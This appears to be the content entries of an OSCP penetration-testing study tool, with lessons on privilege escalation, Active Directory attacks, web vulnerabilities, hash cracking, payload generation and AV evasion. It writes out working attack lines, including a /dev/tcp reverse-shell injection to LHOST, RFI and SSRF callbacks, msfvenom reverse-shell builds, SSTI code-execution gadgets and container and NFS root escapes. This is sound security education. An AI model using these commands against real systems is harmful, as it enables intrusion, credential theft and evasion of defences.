    whoami /priv           # YOUR privileges — SeImpersonate/SeBackup etc. are privesc gold
    whoami /groups         # group membership
    systeminfo             # OS, patch level, architecture (feed to a kernel-exploit finder)
    hostname & ipconfig /all

## Where things live
- Users: C:\Users\;  system: C:\Windows\System32.
- Creds/loot: unattended installs (C:\Windows\Panther\), registry hives, SAM/SYSTEM, the
  DPAPI store, Credential Manager, config files, PowerShell history.
- The registry is a key/value database queried with `reg query`.

## Privesc leads (the Windows equivalents)
- `whoami /priv` tokens (SeImpersonate -> Potato attacks).
- Unquoted service paths, weak service permissions, AlwaysInstallElevated.
- Stored creds, scheduled tasks, writable service binaries.
Run **winPEAS** and read it. (See GTFOBins' Windows cousin: LOLBAS, and `oscp notes`.)

## Pattern
Same loop as Linux: who am I, what privileges/tokens, what runs as SYSTEM, what creds are lying
around — then reuse.

entries.title: Active Directory in one page
entries.brief: Domains, the DC, Kerberos vs NTLM, and the names you must know
entries.body:
## What AD is
Active Directory is a central **directory + authentication** service for a Windows network. A
**domain** groups users, computers and policies; the **Domain Controller (DC)** holds the
database (NTDS.dit) and answers logons. Compromising the domain usually means getting
**Domain Admin** or the DC's secrets.

## Two authentication protocols
- **NTLM** — challenge/response using the password hash. Enables **pass-the-hash**: the NTLM
  hash is as good as the password.
- **Kerberos** — ticket-based. You get a **TGT** at logon, then request **service tickets
  (TGS)** for specific services (identified by an **SPN**).

## The attack names (and their logic)
- **Kerberoasting** — request a TGS for a service account's SPN; it's encrypted with that
  account's password hash -> crack it offline.
- **AS-REP roasting** — accounts with "no pre-auth" hand out a crackable blob for the asking.
- **Pass-the-Hash / Pass-the-Ticket** — reuse a hash/ticket instead of a password.
- **BloodHound** — maps users/groups/sessions to find the shortest path to Domain Admin.

## The tools you'll live in
    nxc smb TARGET -u USER -p PASS --shares        # enumerate (NetExec)
    impacket-GetUserSPNs ... / impacket-secretsdump # roast / dump hashes
    bloodhound-python -c all ...                    # collect the graph
See the full command set in `oscp notes show post-exploitation`.

## Pattern
"Get any domain credential -> enumerate with it -> find a path (BloodHound) -> escalate (roast,
PtH, ACL abuse) -> own the DC." Every AD box is a walk along that graph.

entries.title: Linux capabilities — root, sliced thin
entries.brief: Why a non-SUID binary can still be powerful, and which caps grant root
entries.body:
## The idea
Historically a process was all-or-nothing: root (uid 0) or not. **Capabilities** split root's
powers into ~40 independent units, so a program can hold just the slice it needs. A binary can
carry a capability as a **file capability** — powerful without the SUID bit.

## Find them
    getcap -r / 2>/dev/null        # every file with a capability set

## The ones that mean game over
    cap_setuid       # the program can setuid(0) -> become root. Instant win.
    cap_setgid       # become any group
    cap_dac_override # bypass file read/write permission checks -> read/write any file
    cap_sys_admin    # a near-root grab-bag (mounts, namespaces...)
    cap_sys_ptrace   # attach to any process -> inject into a root process

## Worked example
    # python3 has cap_setuid+ep
    ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # -> root shell
Look the exact technique up:
    oscp gtfo python capabilities

## Pattern
Capabilities are "a named slice of root attached to a file." `getcap -r /` then ask: *does this
cap let me become root, read any file, or inject into one that already is?* If yes, it's a
privesc — even with no SUID bit in sight.

entries.title: Escaping containers & privileged groups (docker, lxd)
entries.brief: Membership of docker/lxd is root — why, and how the escape works
entries.body:
## The shortcut: dangerous group membership
Check `id`. If you're in **docker** or **lxd/lxc**, you are effectively root already — those
groups let you run containers, and a container can mount or run as the host.

## docker group -> root
The docker daemon runs as root. You can start a container that mounts the host's / and chroot
into it:
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh      # root shell on the HOST filesystem
Or use a known image to read/write any host file. (`id` showing `docker` = done.)

## lxd/lxc group -> root
Import a tiny image, launch a **privileged** container with the host disk mounted:
    lxc init alpine c1 -c security.privileged=true
    lxc config device add c1 host disk source=/ path=/mnt/root recursive=true
    lxc start c1 && lxc exec c1 /bin/sh        # /mnt/root is the host's /

## Escaping a container you're already in
Look for: the docker socket mounted inside (`/var/run/docker.sock` -> spawn a host container),
`--privileged` / `SYS_ADMIN` cap (mount host devices), or host paths bind-mounted in.

## Pattern
"Can I run or control a container, or am I inside a too-privileged one?" Containers share the
host kernel; a privileged one (or control of the daemon) is a doorway to the host as root.

entries.title: NFS no_root_squash — make root from a mount
entries.brief: Why a careless NFS export hands you a root shell
entries.body:
## The setup
NFS shares a directory over the network. By default **root_squash** maps a remote root down to
`nobody`, so your root can't write as root on the share. If an export is set **no_root_squash**,
your *local* root is honoured on the share — and that's the whole exploit.

## Spot it
    # on the target (or via showmount from your box):
    cat /etc/exports                       # look for:  /srv *(rw,no_root_squash)
    showmount -e TARGET                     # list exports remotely

## The exploit (you need root on YOUR box, which you have on Kali)
    mkdir /mnt/nfs && mount -o rw TARGET:/srv /mnt/nfs     # mount the share as root
    cp /bin/bash /mnt/nfs/rootbash
    chmod +s /mnt/nfs/rootbash                            # set SUID as root (honoured!)
    # back on the TARGET as the low-priv user:
    /srv/rootbash -p                                       # SUID root bash -> root

Because no_root_squash trusts your root, the SUID bit you set as root is real on the target.

## Pattern
"Does the target export a writable share with no_root_squash?" If so, mount it, plant a SUID-
root binary as root, and run it on the target. (See: permissions-model for the +s bit.)

entries.title: Kernel exploits — last resort, handle with care
entries.brief: When to reach for them, how to match one, and why they're risky
entries.body:
## What they are
When configuration-based privesc (sudo, SUID, caps, cron) fails, a bug in the **kernel itself**
may let a local user become root. Famous ones: DirtyCow (CVE-2016-5195), DirtyPipe
(CVE-2022-0847), PwnKit (polkit, CVE-2021-4034 — technically a SUID helper, not the kernel).

## Match an exploit to the target
    uname -a            # kernel version + arch
    cat /etc/os-release # distro + version
    # feed those to a suggester:
    ./linux-exploit-suggester.sh
    searchsploit linux kernel <version>

## The cautions (why it's last)
- Kernel exploits can **panic/crash the box** — on an exam, you may lose the machine. Snapshot
  first if you can; prefer config-based privesc.
- Match **architecture** (32/64-bit) and compile on a matching system (static if libs differ).
- **Read the exploit** before running it; set offsets/targets correctly.

## Pattern
Exhaust the boring, reliable paths first (enumerate properly). Only when nothing else works,
identify the exact kernel/distro, find a matching, *reviewed* exploit, and run it knowing it
might take the box down. (PwnKit/pkexec and polkit are near-universal and comparatively safe to
try.)

entries.title: File inclusion (LFI / RFI) — making the app read what you want
entries.brief: Why an include of user input leaks files and leads to code execution
entries.body:
## The root cause
The app picks a file to include/read **based on your input**, without restricting the path:
    include($_GET['page'] . '.php');       // ?page=about
If you control that value, you control which file the server reads or runs.

## LFI — include a LOCAL file
    ?page=../../../../etc/passwd%00        // path traversal to a known file (%00 null-byte on old PHP)
    ?page=php://filter/convert.base64-encode/resource=config   // read PHP source without executing it
Reading /etc/passwd confirms it; the base64 filter leaks source (creds, keys) safely.

## LFI -> RCE (log/wrapper poisoning)
Get your code into a file the server will include:
- **Log poisoning**: put PHP in the User-Agent, then include /var/log/apache2/access.log.
- **Wrappers**: `php://input` (POST body as code), `data://text/plain;base64,<payload>`.
- Session files, /proc/self/environ, uploaded files.

## RFI — include a REMOTE file
If `allow_url_include` is on, point it at YOUR server:
    ?page=http://LHOST/shell.txt           // server fetches and runs your PHP

## Pattern
"Does my input choose a file the server reads or runs?" Confirm with /etc/passwd or a
source-leaking wrapper, then find a file you can write to that the app will include -> RCE.

entries.title: OS command injection — your input reaches a shell
entries.brief: When an app passes input to a system shell, your separators run commands
entries.body:
## The root cause
The app builds a shell command with your input and runs it (system(), exec(), backticks):
    system("ping -c1 " . $_GET['host']);
The shell interprets metacharacters, so you add your own command with a separator.

## The separators
    ;   run next unconditionally       host=8.8.8.8; id
    &&  run next if the first succeeds  host=8.8.8.8 && id
    |   pipe into next                  host=8.8.8.8 | id
    `id`  or  $(id)                     command substitution (runs inline)
    %0a  a newline, sometimes needed in URLs

## Confirm it
Time or output is the tell:
    host=8.8.8.8; sleep 5        # response hangs 5s = blind injection confirmed
    host=; id                    # 'uid=...' in the output = direct injection

## Turn it into a shell
    host=; bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
(URL-encode the payload; see encoding-basics and reverse-and-bind-shells.)

## Pattern
"Does my input end up on a shell command line?" Add a separator + your command; confirm with
sleep/id; escalate to a reverse shell. The fix you bypass is avoiding the shell / strict
allow-listing of arguments.

entries.title: SSRF — making the server make requests for you
entries.brief: Why a server fetching a user-supplied URL is dangerous
entries.body:
## The root cause
The server fetches a URL that **you** supply (an image loader, webhook, URL preview, PDF
renderer):
    fetch($_POST['url']);
Now you can make the *server* request things **you** can't reach directly — from inside its
network and with its trust.

## What it buys you
- Hit **internal** services the firewall hides from you: `http://127.0.0.1:8080/admin`,
  `http://10.0.0.5/`.
- Read **cloud metadata** (classic): `http://169.254.169.254/latest/meta-data/` -> credentials.
- Port-scan the internal network by watching response timing/errors.
- Sometimes reach non-HTTP via schemes: `file:///etc/passwd`, `gopher://` (to forge other
  protocols, even Redis/SMTP).

## Find and confirm
Give it a URL pointing back at **you** and watch your listener:
    url=http://LHOST/ssrf-test     # a hit on your `python3 -m http.server` confirms it
Then pivot the URL to internal targets.

## Pattern
"Does the server fetch a URL I control?" If yes, aim it inward — localhost, internal hosts,
cloud metadata — and let the server be your proxy. The fix you bypass is allow-listing
destinations and blocking internal ranges.

entries.title: Malicious file upload — getting a webshell on disk
entries.brief: How upload filters are dodged to land executable code
entries.body:
## The goal and the obstacle
You want to upload code the server will execute (a webshell). Defences check the extension,
the Content-Type, or the file's magic bytes. Each check has a bypass.

## Common bypasses
- **Extension tricks**: `shell.php` blocked? try `.phtml`, `.php5`, `.phar`, `shell.php.jpg`,
  trailing dot/space, or case (`.PHp`). Target what the server executes.
- **Content-Type**: intercept and change the header to `image/png` while the body is PHP.
- **Magic bytes**: prepend a real header (e.g. `GIF89a;`) before your `<?php ... ?>` so a
  content sniffer sees an image.
- **Double extension / path**: `..%2fshell.php` to escape an uploads dir.
- **.htaccess trick**: upload an `.htaccess` that makes a benign extension run as PHP.

## Then run it
Find where it landed (an uploads path, often predictable) and browse to it:
    http://TARGET/uploads/shell.php?cmd=id
Or upload a full reverse-shell PHP and trigger it.

## Pattern
"What does the server check, and what does it execute?" Beat the specific check (name,
Content-Type, or bytes) while keeping the body executable, then locate and trigger the file.

entries.title: White-box source review (the OSWE mindset)
entries.brief: Trace untrusted input from source to sink — how to read code for bugs
entries.body:
## The whole method in one line
*Follow user input (a **source**) to a dangerous operation (a **sink**), and check what happens
in between.* If nothing safely neutralises it, you have a bug.

## Sources — where attacker input enters
Request params, headers, cookies, JSON/XML bodies, file uploads, and anything read back from a
database that an attacker earlier controlled (second-order).

## Sinks — where it becomes dangerous
| Sink | Bug class |
| --- | --- |
| SQL query built with input | SQL injection |
| HTML/JS output without encoding | XSS |
| `system()/exec()` | command injection |
| `include()/require()` | LFI/RFI |
| deserialize() / unpickle / unserialize | insecure deserialization |
| template render of input | SSTI |
| XML parse with entities on | XXE |

## How to hunt
    grep -rniE "exec|system|popen|eval|unserialize|pickle|yaml.load|Runtime.getRuntime|include" src/
Then for each hit, work **backwards**: can user input reach this line? What filtering sits in the
way, and can it be bypassed? Map the routes/controllers to find the reachable entry points.

## Pattern
Don't read the whole app — read the **data flow**. Grep for sinks, trace each one back to a
source, and the exploitable path reveals itself. This is OSWE in a nutshell.

entries.title: XXE — abusing XML external entities
entries.brief: Why an XML parser that resolves entities reads files and reaches internal hosts
entries.body:
## The root cause
XML lets a document define **entities** — and *external* entities whose content the parser
fetches from a URL or file. If the server parses attacker XML with external entities enabled,
you make it read local files or make requests (SSRF).

## The classic payload
    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <foo>&xxe;</foo>
The parser replaces `&xxe;` with the file's contents, which comes back in the response.

## Variations
- **SSRF via XXE**: `SYSTEM "http://169.254.169.254/..."` -> internal/metadata.
- **Blind / out-of-band**: no output? Use a parameter entity that calls back to your server
  (an external DTD) and exfiltrate the file through the URL.
- **Where to inject**: any XML the app accepts — SOAP, SAML, `.docx`/`.svg`/`.xml` uploads,
  or a JSON endpoint that also accepts `Content-Type: application/xml`.

## Find it
Submit a harmless entity that resolves to a value you control and confirm it's expanded. Then
point it at `file:///etc/passwd`.

## Pattern
"Does the server parse XML I supply, with external entities on?" If yes, make it fetch files
or URLs for you. The fix you bypass is disabling external entities (DTDs) in the parser.

entries.title: SSTI — server-side template injection
entries.brief: When your input is rendered as a template, you reach code execution
entries.body:
## The root cause
Template engines (Jinja2, Twig, Freemarker, ERB...) mix static text with `{{ expressions }}`.
If the app builds a template **from user input** instead of passing input as *data*, your input
is evaluated as template code — often a path to RCE.

    render_template_string("Hello " + name)      # name = {{7*7}}  ->  "Hello 49"   (vulnerable)
    render_template("hi.html", name=name)         # safe: input is data, not template

## Detect it
Inject a math expression and see if it's evaluated:
    {{7*7}}      ${7*7}      <%= 7*7 %>      #{7*7}
`49` in the response = SSTI, and the syntax that worked tells you the engine.

## Escalate to RCE (engine-specific)
Template engines expose language internals. Jinja2 example:
    {{ ''.__class__.__mro__[1].__subclasses__() }}        # find a class that runs commands
    {{ cycler.__init__.__globals__.os.popen('id').read() }}
Each engine has a known chain to `os`/`Runtime`; identify the engine first, then use its chain.

## Pattern
"Is my input compiled as a template?" Confirm with `{{7*7}}`-style probes, identify the engine
from which syntax evaluates, then use that engine's known gadget to reach the OS.

entries.title: IDOR & broken access control
entries.brief: Why changing an id or a path lets you act as someone else
entries.body:
## The root cause
The app checks *authentication* (are you logged in?) but not *authorization* (are you allowed
**this** object/action?). So references to objects can be tampered with.

## IDOR — insecure direct object reference
A request names an object by a predictable id; swapping it accesses another user's data:
    GET /api/invoice?id=1043      ->  try 1042, 1044, ...
    GET /account/1337/settings    ->  change the number
Confirmed when you see data that isn't yours.

## Broader broken access control
- **Forced browsing**: hit an admin path directly (`/admin`, `/api/v1/users`) that the UI just
  hides from non-admins.
- **Method/verb**: the UI disables a button, but `POST /api/user/delete` still works.
- **Mass assignment**: add `"role":"admin"` to a JSON body the server trusts.
- **Horizontal vs vertical**: act as another *user* (horizontal) vs gain *higher* privileges
  (vertical).

## Find it
Enumerate ids, replay privileged requests as a low-priv user, and remove/alter the parts that
"shouldn't" be editable. Two accounts side by side make it obvious.

## Pattern
"Does the server re-check that I'm allowed THIS specific object/action — not just that I'm
logged in?" If not, tamper the reference. The fix you bypass is per-object authorization.

entries.title: Insecure deserialization
entries.brief: Why turning attacker bytes back into objects can run code
entries.body:
## The root cause
Serialization turns an object into bytes to store/transmit; deserialization rebuilds it. If the
app deserializes **attacker-controlled** data with an unsafe deserializer, crafting the bytes
can instantiate objects and trigger methods during reconstruction — a **gadget chain** to RCE.

## Where it hides
- Java: `ObjectInputStream.readObject` (look for base64 blobs starting `rO0AB...`).
- PHP: `unserialize()` (strings like `O:4:"User":...`) with magic methods (`__wakeup`,
  `__destruct`).
- Python: `pickle.loads` / `yaml.load` (unsafe) — `__reduce__` runs on load.
- .NET: BinaryFormatter / Json.NET with TypeNameHandling.

## Spot and exploit
Recognise the format (the magic prefixes above), then build a payload that chains existing
classes to a dangerous call:
    ysoserial       # Java gadget chains
    phpggc          # PHP gadget chains
For pickle, `__reduce__` returning `(os.system, ("id",))` runs on `loads`.

## Pattern
"Does the app rebuild objects from data I control, with a deserializer that can invoke code?"
Recognise the blob, find or generate a gadget chain for that stack, and send it. The fix you
bypass is never deserializing untrusted data (or using data-only formats).

entries.title: Cracking workflow: identify -> format -> attack
entries.brief: The repeatable loop for turning a captured hash into a password
entries.body:
## The loop
1. **Identify** the hash type.      2. **Format** it for the cracker.
3. **Attack** (wordlist -> rules -> mask).   4. **Reuse** the cracked password everywhere.

## 1. Identify
    hashid '<hash>'        /  hash-identifier
Clues: length and prefixes — `$1$` md5crypt, `$6$` sha512crypt, `$2b$` bcrypt, `$y$` yescrypt,
32 hex = NTLM/MD5, `aad3b4...` = empty LM.

## 2. Format for the tool
Files become hashes with the *2john helpers (ssh2john, zip2john, keepass2john). For hashcat you
need the right **mode** (-m): 0 MD5, 1000 NTLM, 1800 sha512crypt, 3200 bcrypt, 13100 Kerberoast,
18200 AS-REP, 16500 JWT.

## 3. Attack, cheapest first
    john --wordlist=rockyou.txt hashes.txt            # plain dictionary
    john --wordlist=rockyou.txt --rules hashes.txt     # + mangling rules (append digits, etc.)
    hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule
    hashcat -m 1000 hashes.txt -a3 '?u?l?l?l?l?d?d'    # mask when you know the shape

## 4. Reuse
A cracked password is a key tried **everywhere** — SSH, sudo, SMB, the DB, other users.

## Pattern
Identify -> pick the matching mode -> wordlist, then rules, then masks -> reuse. Online brute
force (hydra) is a different beast — slow, loud, and lockout-prone; prefer offline when you have
the hash.

entries.title: Reading hashes: shadow, NTLM and friends
entries.brief: How to recognise a hash and where each kind comes from
entries.body:
## /etc/shadow — the Linux password store
One line per account; the hash is field 2, colon-separated:
    root:$6$salt$longhash:19700:0:99999:7:::
The `$id$` prefix names the algorithm:
    $1$ md5crypt   $5$ sha256crypt   $6$ sha512crypt   $2a$/$2b$ bcrypt   $y$ yescrypt
`!` or `*` instead of a hash = login disabled. Need root to read shadow; `unshadow passwd
shadow > combined` merges it for John.

## Windows / Active Directory
- **NTLM** (a.k.a. NT hash): 32 hex, unsalted MD4 of the password. `aad3b435...` is the empty
  **LM** half you'll often see paired. Crackable (hashcat -m 1000) AND directly usable via
  pass-the-hash — you don't always need to crack it.
- **Net-NTLMv2**: a challenge/response captured on the wire (e.g. by Responder). NOT usable for
  PtH; crack it (hashcat -m 5600) or relay it.
- **Kerberos**: TGS (-m 13100, Kerberoasting) and AS-REP (-m 18200) blobs you crack offline.

## Quick recognition
    hashid '<hash>'
Length + prefix is usually enough: `$6$` -> Linux sha512; 32 hex, no salt -> NTLM/MD5;
`$krb5tgs$` -> Kerberoast; three base64 parts -> a JWT.

## Pattern
The prefix/length tells you the algorithm; the algorithm tells you the hashcat mode and whether
you must crack it or can reuse it directly (NTLM PtH).

entries.title: msfvenom — generating payloads, and what the parts mean
entries.brief: Platform, payload, LHOST/LPORT and format — the anatomy of a shellcode/binary
entries.body:
## What it does
msfvenom builds a **payload** (shellcode or a standalone file) for a target platform and wraps
it in a chosen **format**. You pick what runs, where it calls back, and how it's packaged.

## The parts
    msfvenom -p <payload> LHOST=<you> LPORT=<port> -f <format> -o <out>
- **-p payload** — what executes. `windows/x64/meterpreter/reverse_tcp` (Metasploit handler) vs
  `.../shell_reverse_tcp` (catch with nc — exam-friendly, no MSF).
- **LHOST/LPORT** — where it connects back (your tun0 IP + a port you listen on).
- **-f format** — exe, elf, raw, war, asp, php, python, dll, and `-f c`/`ps1` for embedding.
- **-e / -b** — encoder and bad-chars to avoid (buffer-overflow work).

## Common ones
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f exe -o s.exe
    msfvenom -p linux/x64/shell_reverse_tcp  LHOST=LHOST LPORT=4444 -f elf -o s
    msfvenom -p php/reverse_php LHOST=LHOST LPORT=4444 -f raw -o s.php
Catch a `shell_reverse_tcp` with `nc -lvnp 4444`; catch a `meterpreter` with multi/handler.

## Pattern
"What runs (payload), where does it call back (LHOST/LPORT), and how is it delivered (format)?"
Match the payload to how you'll catch it — plain reverse shell + nc keeps you MSF-free for
OSCP's one-machine limit.

entries.title: Stack buffer overflow — the OSCP classic
entries.brief: Why overflowing a buffer lets you redirect execution, step by step
entries.body:
## The root cause
A program copies input into a fixed-size stack buffer **without checking the length**. Write
past the buffer and you overwrite what's next on the stack — including the saved **return
address (EIP/RIP)** the CPU jumps to when the function returns. Control EIP = control execution.

## The 5-step OSCP recipe (32-bit)
1. **Fuzz** — send growing input until the service crashes. It's overflowable.
2. **Find the offset** — send a unique pattern; the bytes that land in EIP tell you exactly how
   many bytes precede it.
       msf-pattern_create -l 2000      /      msf-pattern_offset -q <EIP-value>
3. **Control EIP** — send `offset*"A" + "BBBB"`; EIP = 42424242 confirms control.
4. **Find bad chars** — send all bytes 0x01-0xff, see which get mangled in memory; exclude them
   (00 is almost always bad).
5. **Redirect + shellcode** — overwrite EIP with the address of a `JMP ESP` (in a module with no
   protections), then place your shellcode after it.
       msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. -f c -b "\x00.."

## Why JMP ESP
After the overwrite, ESP points at your buffer's tail. `JMP ESP` sends execution there — into
your shellcode. You find a static JMP ESP address (e.g. with mona.py in Immunity Debugger).

## Pattern
"Can I write past the buffer into EIP, and then point EIP at my shellcode?" Fuzz -> offset ->
control EIP -> badchars -> JMP ESP + shellcode. Same logic underlies more advanced memory
corruption; master the simple stack case first.

entries.title: Windows service privesc
entries.brief: Unquoted paths, weak permissions, and writable service binaries
entries.body:
## Why services are a privesc goldmine
Windows services usually run as **SYSTEM**. If you can influence *what* a service executes or
*its configuration*, SYSTEM runs your code — at service start or reboot.

## The three classic flaws
- **Unquoted service path**: a path with spaces and no quotes, e.g.
  `C:\Program Files\My App\svc.exe`. Windows tries `C:\Program.exe`, then
  `C:\Program Files\My.exe`... Drop a malicious `C:\Program.exe` if that dir is writable.
      wmic service get name,pathname,startmode | findstr /i /v '"'   # unquoted, with a space
- **Weak service permissions**: you can reconfigure the service to run your binary.
      sc qc <svc>        # view config
      sc config <svc> binPath= "C:\Temp\rev.exe" && sc start <svc>
- **Writable service binary**: the exe itself is writable — replace it, restart the service.

## Tooling
`winPEAS`, `PowerUp.ps1` (`Invoke-AllChecks`), and `accesschk.exe` surface these automatically:
    accesschk.exe -uwcqv "user" *     # services this user can modify

## Pattern
"Can I change what a SYSTEM service runs — its path, its config, or its binary?" Any one of
those = SYSTEM. Enumerate services, check permissions, then plant/point to your payload and
(re)start it. (See: msfvenom-payloads for the exe.)

entries.title: Token privileges & UAC
entries.brief: SeImpersonate/Potato attacks and what UAC actually gates
entries.body:
## whoami /priv is your map
Windows privileges are per-token. `whoami /priv` lists yours; a few are effectively "become
SYSTEM":

- **SeImpersonatePrivilege** / **SeAssignPrimaryToken** — held by service accounts (IIS, MSSQL,
  `NT AUTHORITY\...`). The **Potato** family (JuicyPotato, PrintSpoofer, GodPotato) tricks a
  SYSTEM process into authenticating to you, then you impersonate its token -> SYSTEM.
      PrintSpoofer.exe -i -c cmd      /      GodPotato -cmd "cmd /c whoami"
- **SeBackupPrivilege** — read any file (grab SAM/SYSTEM, or NTDS.dit on a DC).
- **SeDebugPrivilege** — open any process (dump lsass, inject).
- **SeLoadDriver**, **SeTakeOwnership** — their own escalation paths.

## UAC in one paragraph
UAC splits an admin's token into a filtered (standard) and a full (elevated) token. A process
runs filtered until it's elevated ("Run as administrator" / a consent prompt). A **UAC bypass**
launches a trusted auto-elevating binary to run your code with the full token — relevant when
you're an *admin* user in a *medium-integrity* shell, not for going from standard user to admin.

## Pattern
Read `whoami /priv`. A service token with SeImpersonate -> Potato -> SYSTEM. Backup/Debug ->
read secrets / touch any process. The privilege names ARE the exploit index.

entries.title: Kerberos delegation (unconstrained / constrained / RBCD)
entries.brief: Why 'this service may act as you' becomes domain compromise
entries.body:
## The idea
Delegation lets a service authenticate to *another* service **on a user's behalf** (e.g. a web
app reaching a database as you). Misconfigured, it lets an attacker impersonate anyone — up to
Domain Admin.

## Three flavours
- **Unconstrained** — a host can impersonate any user who authenticates to it. If you compromise
  such a host (or coerce a DC to auth to it), you capture a DC's TGT -> DCSync -> game over.
- **Constrained (S4U)** — a service may impersonate users *to specific SPNs*. Control the
  service account and you can request tickets to those targets as any user (incl. admins).
- **Resource-Based (RBCD)** — the *target* object says who may delegate to it. If you can write
  its `msDS-AllowedToActOnBehalfOfOtherIdentity` (via an ACL you control), you grant yourself
  impersonation to it.

## The tools
    # find delegation:
    bloodhound (edges), Get-NetComputer -Unconstrained
    # abuse (Impacket):
    impacket-getST -spn cifs/target -impersonate Administrator 'DOMAIN/svc:pass'
Coercion (PrinterBug/PetitPotam) forces a victim to authenticate, feeding unconstrained/RBCD
chains.

## Pattern
Delegation = "service X may act as user Y". Find who may delegate to what (BloodHound), get
control of that account or write the right attribute, then request a ticket impersonating an
admin. It's ACL/ticket abuse, not cracking.

entries.title: AV/EDR evasion — the concepts
entries.brief: Why defenders flag your payload, and the high-level ways offensive testers get past it
entries.body:
## Why your payload gets caught
Defenders match on three things:
- **Signatures** — known byte patterns (a stock msfvenom exe is in every AV database).
- **Heuristics/behaviour** — suspicious API sequences at runtime (process injection, lsass
  access) spotted by EDR.
- **AMSI** (Windows) — scans scripts/PowerShell *in memory* before execution.

## The high-level counters (authorised testing only)
- **Don't use stock artifacts** — a default meterpreter exe is instantly known. Generate unique
  output, or compile your own small loader.
- **Obfuscate / encode** — change the bytes without changing behaviour so signatures miss;
  encrypt the payload and decrypt at runtime.
- **Live off the land (LOLBAS)** — use trusted built-in binaries (certutil, regsvr32, mshta) so
  there's no foreign exe to flag.
- **AMSI bypass** — patch/disable the in-memory scanner in your session before running scripts.
- **Reduce behavioural tells** — avoid the noisiest API patterns; prefer in-memory to on-disk.

## For OSCP specifically
Most lab machines have AV off or lenient; a plain reverse shell usually works. When Defender
bites, a non-default payload, a different format, or a LOLBAS delivery is usually enough — deep
EDR evasion is OSEP/red-team territory, not OSCP.

## Pattern
"What is the defender matching on — bytes, behaviour, or the script scanner — and can I avoid
being that?" Unique artifacts, obfuscation, LOLBAS, and in-memory execution are the levers.
Only ever against systems you're authorised to test.

entries.title: tmux — never lose a shell or a scrollback
entries.brief: Panes, windows and persistence, and why it matters mid-engagement
entries.body:
## Why tmux
A terminal multiplexer keeps sessions **alive** when your connection drops, splits one terminal
into many **panes/windows**, and logs everything. On a box you can't afford to lose a catching
listener or a long scan to a dropped SSH.

## The essentials (prefix defaults to Ctrl-b)
    tmux new -s oscp           # start a named session
    tmux attach -t oscp        # re-attach after a disconnect  (the killer feature)
    Ctrl-b "                   # split horizontally   |   Ctrl-b %  vertical
    Ctrl-b <arrow>             # move between panes
    Ctrl-b c                   # new window   |   Ctrl-b n/p  next/prev
    Ctrl-b d                   # detach (session keeps running)
    Ctrl-b [                   # scroll/copy mode (q to exit)

## Workflow that scales
One window per job: a pane for your `nc` listener, one for scans, one for notes. Name windows
(`Ctrl-b ,`) so you find them. Because the session persists server-side, a VPN blip never kills
your reverse shell.

## Logging for the report
    tmux pipe-pane -o 'cat >> ~/engagement.log'    # capture a pane to a file
Or run tools with their own output flags (nmap -oA, tee) so every result is saved.

## Pattern
"Keep every shell, scan and note alive and recorded." Named sessions + panes per task +
re-attach after drops = you never lose work or a foothold.

entries.title: Notes & the report (the part that passes)
entries.brief: Capture as you go — because OSCP is graded on the report, not the root flag
entries.body:
## Why this is a core skill
OSCP (and real engagements) are judged on a **report**: reproducible steps, evidence, and the
flags. A root shell you can't reproduce or evidence doesn't count. Capture *while* you work, not
after.

## Capture as you go
- **Per target**: a running log of every command and its key output, the creds found, and the
  exact exploit steps. Markdown/Obsidian/CherryTree — anything searchable.
- **Evidence**: screenshots of proof.txt/local.txt **with your IP visible** (`ip a` in frame),
  and the commands that got you there. Save tool output (`nmap -oA`, `tee`).
- **Credentials table**: user : password/hash : where it works. You will reuse these constantly.

## Make it reproducible
Write steps so a stranger could repeat them: the exact URL/payload, the exact command, the
result. "I ran linpeas and got root" fails; "writable /etc/passwd, added a UID-0 user, `su`"
passes.

## A simple per-box template
    # <box IP>
    ## Recon      (nmap outputs, open ports)
    ## Enumeration (per service, findings)
    ## Foothold    (the exploit, exact steps, proof)
    ## Privesc     (the path, exact steps, proof)
    ## Loot        (creds, hashes, interesting files)

## Pattern
"Could I rebuild this from my notes tomorrow?" If not, you haven't finished the box. Evidence
and reproducibility are the deliverable.

entries.title: SMB enumeration — a systematic checklist
entries.brief: The ordered passes that squeeze a Windows/Samba host dry
entries.body:
## Why a checklist
SMB (445) leaks an enormous amount when you probe it in order. Work top-to-bottom; each step may
unlock the next (anonymous -> a user -> creds -> admin).

## The passes
1. **Shares, anonymously**
       smbclient -L //TARGET -N
       nxc smb TARGET -u '' -p '' --shares
2. **Full aggregate enum**
       enum4linux-ng -A TARGET
3. **RPC null session** (users, policy)
       rpcclient -U '' -N TARGET   ->  enumdomusers; querydominfo; getdompwinfo
4. **Per-share access** (read/write)
       smbmap -H TARGET -u '' -p ''
5. **With any creds you find**, repeat 1-4 authenticated, then:
       nxc smb TARGET -u user -p pass --users --rid-brute --pass-pol
6. **Mount/pull readable shares** and grep them for creds/config.
       smbclient //TARGET/share -N -c 'recurse ON; prompt OFF; mget *'

## What you're hunting
Usernames (for spraying), a password policy (lockout threshold before you spray), readable
shares with configs/scripts/creds, and write access (drop a payload, or SCF/LNK capture).

## Pattern
Anonymous -> aggregate -> RPC -> per-share -> re-run authenticated. Each artifact (a username, a
share, a password) feeds the next pass. Full command set: `oscp show smb` and `oscp atlas nxc`.

entries.title: su vs sudo -i vs sudo <command>
entries.brief: Three ways to run as another user — whose password, what shell, what's logged
entries.body:
## The one question that separates them: WHOSE password?
- **su** asks for the **target** user's password.  **sudo** asks for **your own** (and only if
  policy in /etc/sudoers allows it). That's the core difference.

## su <user>
Switches to another user by proving you know *their* password.
    su bob            # become bob (keeps current dir/most env) — needs bob's password
    su - bob          # a LOGIN shell: loads bob's env, lands in bob's home ('su -l')
    su                # become root — needs the ROOT password (often disabled on Kali/Ubuntu)
`su -` matters: without the dash you keep your own environment; with it you get a clean login
shell as the target (the realistic "logged in as them").

## sudo <command>
Run ONE command as root (or `-u user`), authorised by the sudoers policy, using YOUR password.
Every use is logged (/var/log/auth.log). This is least-privilege: elevate for one action.
    sudo cat /etc/shadow
    sudo -u www-data id        # run as a specific user

## sudo -i  (and -s)
Open an interactive **root shell** via sudo (your password, if permitted).
    sudo -i    # a root LOGIN shell: root's env + /root  (like logging in as root)
    sudo -s    # a root shell that KEEPS your current env
    sudo bash  # same idea

